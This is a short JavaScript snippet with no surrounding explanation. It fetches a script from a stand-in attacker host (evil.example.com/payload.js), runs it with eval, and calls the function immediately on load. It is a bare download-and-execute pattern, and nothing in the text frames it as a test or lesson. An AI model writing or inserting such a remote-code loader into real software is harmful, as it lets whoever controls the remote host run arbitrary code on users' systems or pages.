async function loadRemote() {
  const response = await fetch('http://evil.example.com/payload.js');
  const code = await response.text();
  eval(code);
}

loadRemote();
